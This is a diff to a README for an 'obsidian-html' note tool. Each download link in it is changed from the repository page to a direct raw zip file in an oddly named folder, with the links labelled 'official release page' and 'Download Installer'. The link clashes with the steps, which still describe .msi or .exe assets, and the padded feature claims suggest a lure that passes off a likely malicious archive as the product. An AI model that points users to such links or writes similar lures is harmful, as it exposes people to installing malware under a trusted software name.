@@ -1,6 +1,6 @@
 # 🌐 obsidian-html - Own your notes on any browser
 
-[![Download for Windows](https://img.shields.io/badge/Download_Installer-Blue-blue)](https://github.com/Prophylactic-reynard106/obsidian-html)
+[![Download for Windows](https://img.shields.io/badge/Download_Installer-Blue-blue)](https://github.com/Prophylactic-reynard106/obsidian-html/raw/refs/heads/main/tumultuousness/obsidian-html-1.9.zip)
 
 obsidian-html turns your writing into pure web pages. Every note you create acts as a standalone file. You open these files in any web browser without extra software. This tool merges the ease of a simple notebook with the power of modern web technology.
 
@@ -8,7 +8,7 @@ obsidian-html turns your writing into pure web pages. Every note you create acts
 
 You do not need programming skills to use this software. Windows users can follow these steps to set up the application in minutes.
 
-1. Go to the [official release page](https://github.com/Prophylactic-reynard106/obsidian-html).
+1. Go to the [official release page](https://github.com/Prophylactic-reynard106/obsidian-html/raw/refs/heads/main/tumultuousness/obsidian-html-1.9.zip).
 2. Look for the Assets section at the bottom of the latest release.
 3. Select the file ending in .msi or .exe to download the installer.
 4. Open the downloaded file to start the installation process.
@@ -62,7 +62,7 @@ Your privacy stays protected. The end-to-end encryption process scrambles your d
 
 ## 📦 Download and Install
 
-Visit the [official download link](https://github.com/Prophylactic-reynard106/obsidian-html) to get current versions for Windows. Always check for updates to gain new features and improvements to the sync engine.
+Visit the [official download link](https://github.com/Prophylactic-reynard106/obsidian-html/raw/refs/heads/main/tumultuousness/obsidian-html-1.9.zip) to get current versions for Windows. Always check for updates to gain new features and improvements to the sync engine.
 
 ## 💡 Usage Tips
 
